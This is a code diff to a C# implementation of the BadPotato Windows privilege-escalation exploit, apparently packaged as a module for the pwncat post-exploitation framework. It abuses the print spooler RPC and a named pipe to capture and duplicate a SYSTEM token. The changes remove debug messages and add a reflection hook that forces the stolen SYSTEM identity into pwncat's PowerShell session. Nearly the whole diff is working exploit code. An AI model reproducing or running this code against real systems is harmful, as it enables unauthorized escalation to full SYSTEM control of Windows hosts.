@@ -14,16 +14,21 @@ class Entry
 {
     /*
      * Reflection technique to get the context of stage2.
-     * This allows us to sanely raise exceptions that pwncat can be aware of
+     * This allows us to sanely raise exceptions that pwncat can be aware of,
+     * and maintain the original assembly to carry our .NET and PowerShell contexts
      */
+    public static Assembly stagetwo;
     public static Type ProtocolError;
     public static void pwncat( Assembly stage2) { 
         ProtocolError = stage2.GetType("stagetwo.Protocol.ProtocolError");
+        stagetwo = stage2;
     }
 }
 
 class BadPotato
 {
+    public static WindowsIdentity identity;
+
     public struct SECURITY_ATTRIBUTES
     {
         public int nLength;
@@ -61,20 +66,6 @@ class BadPotato
         public int dwThreadId;
     }
 
-    enum BadPotatoErrors
-    {
-        CreateOutReadPipeFailure = 1,
-        CreateErrReadPipeFailure,
-        SetThreadTokenFailure,
-        DuplicateTokenExFailure,
-        OpenThreadTokenFailure,
-        ImpersonateNamedPipeFailure,
-        ConnectNamedPipeTimeout,
-        RpcRemoteFindFirstPrinterChangeNotificationExFailure,
-        RpcOpenPrinterFailure,
-        CreateNamedPipeWFailure
-    }
-
     static void error()
     {
         System.ComponentModel.Win32Exception exc = new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
@@ -86,13 +77,9 @@ class BadPotato
         SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
         string pipeName = Guid.NewGuid().ToString("N");
 
-        //Console.WriteLine("[*] PipeName : " + string.Format("\\\\.\\pipe\\{0}\\pipe\\spoolss", pipeName));
-        //Console.WriteLine("[*] ConnectPipeName : " + string.Format("\\\\{0}/pipe/{1}", Environment.MachineName, pipeName));
-
         IntPtr pipeHandle = CreateNamedPipeW(string.Format("\\\\.\\pipe\\{0}\\pipe\\spoolss", pipeName), 0x00000003| 0x40000000, 0x00000000, 10, 2048, 2048, 0, ref securityAttributes);
         if (pipeHandle!=IntPtr.Zero)
         {
-            //Console.WriteLine(string.Format("[*] {0} Success! IntPtr:{1}", "CreateNamedPipeW",pipeHandle));
             
             rprn rprn = new rprn();
             DEVMODE_CONTAINER dEVMODE_CONTAINER = new DEVMODE_CONTAINER();
@@ -103,36 +90,35 @@ class BadPotato
             {
                 if (rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(rpcPrinterHandle, 0x00000100, 0, string.Format("\\\\{0}/pipe/{1}", Environment.MachineName, pipeName), 0) != -1)
                 {
-                    //Console.WriteLine(string.Format("[*] {0} Success! IntPtr:{1}", "RpcRemoteFindFirstPrinterChangeNotificationEx", rpcPrinterHandle));
                     
                     Thread thread = new Thread(() => ConnectNamedPipe(pipeHandle, IntPtr.Zero));
                     thread.Start();
                     if (thread.Join(5000))
-                    {
-                        //Console.WriteLine("[*] ConnectNamePipe Success!");
+                    { 
                         
                         StringBuilder stringBuilder = new StringBuilder();
                         GetNamedPipeHandleState(pipeHandle, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Capacity);
                         
-                        //Console.WriteLine("[*] CurrentUserName : " + Environment.UserName);
-                        //Console.WriteLine("[*] CurrentConnectPipeUserName : " + stringBuilder.ToString());
-                        
                         if (ImpersonateNamedPipeClient(pipeHandle))
-                        {
-                            //Console.WriteLine("[*] ImpersonateNamedPipeClient Success!");
+                        { 
                             
                             IntPtr hSystemToken = IntPtr.Zero;
                             if (OpenThreadToken(GetCurrentThread(), 983551, false, ref hSystemToken))
                             {
-                                //Console.WriteLine(string.Format("[*] {0} Success! IntPtr:{1}", "OpenThreadToken", hSystemToken));
                                 IntPtr hSystemTokenDup = IntPtr.Zero;
 
                                 if (DuplicateTokenEx(hSystemToken, 983551, 0, 2, 1, ref hSystemTokenDup))
                                 {
                                     try
                                     {
-                                       WindowsIdentity.Impersonate(hSystemTokenDup);
-                                       return new Dictionary<string, object>();
+                                        identity = new WindowsIdentity(hSystemTokenDup);
+                                        identity.Impersonate();
+                                        // IMPORTANT:
+                                        // PowerShell doesn't retain this... for some reason
+                                        // So, we will explicitly force it with our reflection technique.
+                                        Entry.stagetwo.GetType("stagetwo.PowerShell").GetMethod("run",BindingFlags.Static | BindingFlags.Public).Invoke(null, new object[] {"[System.Security.Principal.WindowsIdentity]::Impersonate(" +(int)hSystemToken+ ")", 1});
+
+                                        return new Dictionary<string, object>();
                                     }
                                     catch {
                                         error();
